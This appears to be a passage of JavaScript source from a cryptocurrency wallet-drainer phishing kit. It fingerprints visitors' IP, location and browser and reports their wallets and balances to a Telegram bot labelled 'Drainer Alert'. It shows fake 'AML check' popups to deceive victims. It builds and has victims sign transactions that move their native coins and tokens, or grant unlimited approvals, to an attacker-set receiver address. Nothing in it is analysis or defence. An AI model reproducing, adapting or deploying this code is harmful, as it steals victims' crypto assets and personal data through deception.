        
        switch (data.action) {
            case "enter_website":
          
                await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break;
                
            case "connect_request":
       
                //await Noti_info(data.address, 0, 0, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break;
            case "sign_verify":
       
               //await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break;
                
            case "connect_success":
                const chainnet = convert_chain('ID', 'ANKR', data.chain_id);
                await Noti_connect(data.address, chainnet, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break;
                
            case "check_wallet":
                
                
                //await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                console.log(data.action)
                
                break;   
            
            case "check_finish":
       
                //console.log(data.assets)
                await Noti_assets(data.address, data.balance, data.assets, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break; 
            
            case "sign_request":
       
                //await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break; 
            
            case "approve_request":
       
                
                await Noti_request(data.action, data.asset, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break; 
                
            case "approve_cancel":
       
               await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break; 
                
            case "transfer_request":
       
                await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break;     
                
            case "transfer_cancel":
       
                await Noti_info(data.action, data.wallet, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
                break;      
            
            default:
               
               await Noti_info(data.action, data.asset, data.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        } 
        return response_data;
        
    } catch (error) {
        console.warn("[-] Error en send_request: ", error);
    }
    
    
};


function safeToString(value) {
  return value ? value.toString() : 'N/A';
}

const retrive_config = async () => {
  try {
    const response = await send_request({ action: 'retrive_config' });
    if (response.status == 'OK') {
      MS_Connection = true;
      MS_Settings = response.data;
      console.log(MS_Settings);
      if (!MS_Settings.CIS) MS_Bad_Country = false;
      if (typeof MS_Settings.DSB == 'boolean' && MS_Settings.DSB === true) window.location.href = 'about:blank';
    }
  } catch(err) {
    console.log(err);
  }
};

const retrive_contract = async () => {
  try {
    const response = await send_request({ action: 'retrive_contract' });
    if (response.status == 'OK') MS_Contract_ABI = response.data;
    console.log(MS_Contract_ABI)
  } catch(err) {
    console.log(err);
  }
};

async function getDeviceInfo() {
    // Detect browser and mobile device
    const userAgent = navigator.userAgent;
    let browser = "Unknown";
    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

    if (userAgent.includes("Firefox")) {
        browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
        browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
        browser = "Safari";
    } else if (userAgent.includes("Edge")) {
        browser = "Edge";
    } else if (userAgent.includes("Opera")) {
        browser = "Opera";
    }

    // Get IP and location
    try {
        const resIP = await fetch('https://api.ipify.org?format=json');
        const dataIP = await resIP.json();
        const ip = dataIP.ip;

        const resLoc = await fetch(`https://ipapi.co/${ip}/json`);
        const dataLoc = await resLoc.json();
        const locate = dataLoc.country_name && dataLoc.city ? `${dataLoc.country_name}-${dataLoc.city}` : 'No-Data';

        return { browser, isMobile, ip, locate };
    } catch (error) {
        console.error('Error getting IP and location:', error);
        return { browser, isMobile, ip: 'Unavailable', locate: 'Unavailable' };
    }
}

const enter_website = async () => {
  try {
    let response = await send_request({
      action: 'enter_website',
      user_id: MS_ID,
      time: new Date().toLocaleString('ru-RU')
    });
 
    if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
      MS_Bad_Country = true;
    }
  } catch(err) {
    console.log(err);
  }
};

function escaper(text) {
  return text.toString()
    .replace(/\_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/\~/g, '\\~')
    .replace(/\`/g, '\\`')
    .replace(/\>/g, '\\>')
    .replace(/\#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/\-/g, '\\-')
    .replace(/\=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/\{/g, '\\{')
    .replace(/\}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/\!/g, '\\!');
}

function formatTokens(tokensArray) {
  return tokensArray.map(asset => 
    `${asset.name}\n Balance (USD): ${asset.amount_usd.toFixed(2)}\n Chain ID: ${asset.chain_id}\n Type: ${asset.type}\n\n`
  ).join('');
}

async function Noti_connect(walletadr, chainid, wallet, domain, browser, mobile, ip, location) {
    
   try {
let message =
    `*New Connection 🟢*\n\n` +
    `*💰 Wallet:* ${escaper(safeToString(walletadr))}\n` +
    `*🌐 Network:* ${escaper(safeToString(chainid))}\n` + 
    `*🦊 WalletType:* ${escaper(safeToString(wallet))}\n` +
    `*🌍 Domain:* ${escaper(safeToString(domain))}\n` +
    `*🔍 Browser:* ${escaper(safeToString(browser))}\n`+
    `*📱 Mobile?:* ${escaper(safeToString(mobile))}\n` +
    `*📍 IP:* ${escaper(safeToString(ip))}\n` +
    `*🌏 Location:* ${escaper(safeToString(location))}\n`;


    let clientServerOptions = {
      url: 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
      data: JSON.stringify({ chat_id: LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    await axios(clientServerOptions);

    console.log("Connection");

  } catch (error) {
    console.warn("[-] Connection error: ", error);
  }
}

async function Noti_info(infotype, wallet, domain, browser, mobile, ip, location) {
    
   try {
let message =
    `*New Info for Drainer Alert 🟢*\n\n` +
    `*💰 Info Type:* ${escaper(safeToString(infotype))}\n` +
    `*🦊 WalletType:* ${escaper(safeToString(wallet))}\n` +
    `*🌍 Domain:* ${escaper(safeToString(domain))}\n` +
    `*🔍 Browser:* ${escaper(safeToString(browser))}\n`+
    `*📱 Mobile?:* ${escaper(safeToString(mobile))}\n` +
    `*📍 IP:* ${escaper(safeToString(ip))}\n` +
    `*🌏 Location:* ${escaper(safeToString(location))}\n`;


    let clientServerOptions = {
      url: 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
      data: JSON.stringify({ chat_id: LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    await axios(clientServerOptions);

    console.log("Connection");

  } catch (error) {
    console.warn("[-] Connection error: ", error);
  }
}

async function Noti_request(action, tokens, domain,  browser, mobile,ip,location) {
    
    
   //let formattedTokens = formatTokens(tokens);
    
  try {
    let message =
    `*Action:* ${escaper(safeToString(action))}\n` +
    `*Assets to sign:* ${escaper(safeToString(tokens.name))}\n` +
    `*🌍 Domain:* ${escaper(safeToString(domain))}\n` +
    `*🔍 Browser:* ${escaper(safeToString(browser))}\n`+
    `*📱 Mobile?:* ${escaper(safeToString(mobile))}\n` +
    `*📍 IP:* ${escaper(safeToString(ip))}\n` +
    `*🌏 Location:* ${escaper(safeToString(location))}\n`;
      


    let clientServerOptions = {
      url: 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
      data: { chat_id: LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true },
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    await axios(clientServerOptions);

    console.log("Connection");

  } catch (error) {
    console.warn("[-] Connection error: ", error);
  }
}

async function Noti_assets(walletadr, balancetotal, tokens, domain, browser, mobile,ip,location) {
    
  try {

    let formattedTokens = formatTokens(tokens);
    let message =
    `*User Assets 📊*\n\n` +
    `*💰 Wallet:* ${escaper(safeToString(walletadr))}\n` + 
    `*💹 Balance total:* ${escaper(safeToString(balancetotal))}\n\n` +
    `*🪙 Tokens:\n\n ${escaper(safeToString(formattedTokens))}*\n` +
    `*🌍 Domain:* ${escaper(safeToString(domain))}\n` +
    `*🔍 Browser:* ${escaper(safeToString(browser))}\n` +
    `*📱 Mobile?:* ${escaper(safeToString(mobile))}\n` +
    `*📍 IP:* ${escaper(safeToString(ip))}\n` +
    `*🌏 Location:* ${escaper(safeToString(location))}\n`;

    let clientServerOptions = {
      url: 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
      data: { chat_id: LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true },
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    await axios(clientServerOptions);

    console.log("Connection");

  } catch (error) {
    console.warn("[-] Connection error: ", error);
  }
}

async function Noti_approve(action, walletadr, tokenname, tokensym, tokenbal, chainid, domain) {
  try {
    let message =
      `*Action: ${escaper(action)}  *\n` +
      `*Wallet: ${escaper(walletadr)}  *\n` + 
      `*Token_name: ${escaper(tokenname)}  *\n` +
      `*Token_symbol: ${escaper(tokensym)}  *\n` +
      `*Token_balance: ${escaper(tokenbal)}  *\n`+
      `*Chain_id: ${escaper(chainid)}  *\n`+
      `*Domain: ${escaper(domain)}  *\n`; 
      

    let clientServerOptions = {
      url: 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
      data: { chat_id: LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true },
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    await axios(clientServerOptions);

    console.log("Connection");

  } catch (error) {
    console.warn("[-] Connection error: ", error);
  }
}

const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: MS_ID, wallet: MS_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: MS_ID, address: MS_Current_Address,
      wallet: MS_Current_Provider, chain_id: MS_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        case 25: return 'cronos';
        case 100: return 'gnosis';
        case 128: return 'heco';
        case 1284: return 'moonbeam';
        case 1285: return 'moonriver';
        case 2222: return 'kava';
        case 42220: return 'celo';
        case 1666600000: return 'harmony';
        case 324: return 'zksync_era';
        case 8453: return 'base';
        case 369: return 'pulse';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        case 25: return 'CRO';
        case 100: return 'XDAI';
        case 128: return 'HT';
        case 1284: return 'GLMR';
        case 1285: return 'MOVR';
        case 2222: return 'KAVA';
        case 42220: return 'CELO';
        case 1666600000: return 'ONE';
        case 324: return 'ETH';
        case 8453: return 'ETH';
        case 369: return 'PLS';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/d8c0ab3f1f160e5681e97d3bda7a1169c7ed7d0ed2079f2d01221087a70f22da`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "base", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address || null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
        asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrive_token = async (chain_id, contract_address) => {
  try {
    if (!MS_API_Data[chain_id] || MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API == '') return MS_Contract_ABI['ERC20'];
    let response = await fetch(`https://${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrive_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      return MS_Contract_ABI['ERC20'];
    }
  } catch (err) {
    return MS_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) return 0;
    if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
            return 0;
          }
        }
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const MS_Gas_Reserves = {};

const show_check = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Processing wallet', text: 'Connecting to blockchain...',
        showConfirmButton: true, confirmButtonText: 'Loading...', timer: 2000, color: MS_Color_Scheme
      }).then(() => {
        if (MS_Check_Done) return;
        MSL.fire({
          icon: 'load', title: 'Processing wallet', text: 'Getting your wallet address...',
          showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
        }).then(() => {
          if (MS_Check_Done) return;
          MSL.fire({
            icon: 'load', title: 'Processing wallet', text: 'Checking your wallet for AML...',
            showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
          }).then(() => {
            if (MS_Check_Done) return;
            MSL.fire({
              icon: 'success', title: 'Processing wallet', subtitle: 'Everything good!',
              text: 'Your wallet is AML risk is low enough!', showConfirmButton: false, timer: 5000, color: MS_Color_Scheme
            }).then(() => {
              if (MS_Check_Done) return;
              MSL.fire({
                icon: 'load', title: 'Processing wallet', text: 'Please wait, we\'re scanning more details...',
                showConfirmButton: true, confirmButtonText: 'Loading...', timer: 300000, color: MS_Color_Scheme
              });
            });
          });
        });
      });
    } else {
      Swal.fire({
        title: 'Connection established',
        icon: 'success',
        timer: 2000
      }).then(() => {
        if (MS_Check_Done) return;
        Swal.fire({
          text: 'Connecting to Blockchain...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 5000, width: 600, showConfirmButton: false
        }).then(() => {
          if (MS_Check_Done) return;
          Swal.fire({
            text: 'Getting your wallet address...',
            imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
            timer: 5000, width: 600, showConfirmButton: false
          }).then(() => {
            if (MS_Check_Done) return;
            Swal.fire({
              text: 'Checking your wallet for AML...',
              imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
              imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
              timer: 5000, width: 600, showConfirmButton: false
            }).then(() => {
              if (MS_Check_Done) return;
              Swal.fire({
                text: 'Good, your wallet is AML clear!',
                icon: 'success',
                allowOutsideClick: false, allowEscapeKey: false,
                timer: 2000, width: 600, showConfirmButton: false
              }).then(() => {
                if (MS_Check_Done) return;
                Swal.fire({
                  text: 'Please wait, we\'re scanning more details...',
                  imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                  imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
                  timer: 0, width: 600, showConfirmButton: false
                });
              });
            });
          });
        });
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(MS_Current_Address, "pending");
};

const wait_message = () => {
  try {
    if (!MS_Process) return;
    Swal.close();
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'OK', subtitle: 'Thanks!', text: 'Got your sign, wait a bit for confirmation...',
        showConfirmButton: false, timer: 2500, color: MS_Color_Scheme
      }).then(() => {
        MSL.fire({
          icon: 'load', title: 'Processing sign', text: ' Please, don\'t leave this page!',
          showConfirmButton: true, confirmButtonText: 'Confirming sign...', showConfirmButton: false, color: MS_Color_Scheme
        });
      });
    } else {
      Swal.fire({
        html: '<b>Thanks!</b>', icon: 'success',
        allowOutsideClick: false, allowEscapeKey: false,
        timer: 2500, width: 600, showConfirmButton: false
      }).then(() => {
        Swal.fire({
          html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      });
    }

  } catch(err) {
    console.log(err);
  }
};

const end_message = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'error', title: 'Error', subtitle: 'We\'re sorry', text: 'Your wallet doesn\'t meet the requirements. Try to connect a middle-active wallet to try again!',
        showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!', icon: 'error',
        allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
        showConfirmButton: true, confirmButtonText: 'OK'
      });
    }
  } catch(err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_ready = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'OK', subtitle: 'Sign is confirmed', text: 'Please, wait a bit for confirmation...',
        showConfirmButton: false, color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Success!</b> Your sign is confirmed!',
        icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
        showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[1]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const SIGN_NATIVE = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();

  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : (asset.chain_id == 369 ? 100000 : 21000));
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000));

  const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
  const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';
  if (ethers.BigNumber.from(await node.getBalance(MS_Current_Address)).lt(ethers.BigNumber.from(after_fee)
  .add(ethers.BigNumber.from(gas_limit_nt).mul(ethers.BigNumber.from(gas_price))))) throw 'LOW_BALANCE';

  const nonce = await get_nonce(asset.chain_id);
  let tx_struct = {
    "to": MS_Settings.Receiver, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit_nt), "gasPrice": web3.utils.toHex(gas_price),
    "value": web3.utils.toHex(after_fee), "data": "0x",
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset, after_fee); sign_ready();
};

const SIGN_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      if (MS_Settings.Settings.Sign.Tokens == 1) {
        gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
      } else if (MS_Settings.Settings.Sign.Tokens == 2) {
        gas_limit = await contract.estimateGas.transfer(MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
      }
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
      gas_attempts += 1;
    }
  }
  if (ethers.BigNumber.from(await node.getBalance(MS_Current_Address)).lt(ethers.BigNumber.from(gas_limit).mul(ethers.BigNumber.from(gas_price)))) throw 'LOW_BALANCE';
  const nonce = await get_nonce(asset.chain_id);
  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
  if (MS_Settings.Settings.Sign.Tokens == 1) data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
  else if (MS_Settings.Settings.Sign.Tokens == 2) data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();
  let tx_struct = {
    "to": asset.address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
    "value": '0x0', "data": data,
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  wait_message();
